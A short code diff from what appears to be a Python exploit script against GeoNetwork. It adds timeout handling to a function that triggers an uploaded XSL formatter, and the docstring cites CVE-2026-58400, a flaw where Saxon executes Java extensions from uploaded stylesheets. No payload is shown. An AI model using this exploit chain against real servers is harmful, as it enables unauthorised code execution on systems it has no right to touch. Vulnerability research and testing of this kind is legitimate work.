@@ -149,14 +149,19 @@ def upload_formatter(session, base_url, token, name, xsl_content):
     return r.status_code, r.text
 
 
-def trigger_formatter(session, base_url, uuid, name):
+def trigger_formatter(session, base_url, uuid, name, timeout=10):
     """
     CVE-2026-58400: Saxon executes Java extensions from uploaded XSL.
     Saxon is configured with ALLOW_EXTERNAL_FUNCTIONS=true.
     """
     url = urljoin(base_url, f"/geonetwork/srv/api/records/{uuid}/formatters/{name}")
-    r = session.get(url, headers={"Accept": "text/html"})
-    return r.status_code, r.text
+    try:
+        r = session.get(url, headers={"Accept": "text/html"}, timeout=timeout)
+        return r.status_code, r.text
+    except requests.exceptions.Timeout:
+        return 0, ""
+    except requests.exceptions.ConnectionError:
+        return 0, ""
 
 
 def parse_output(raw):
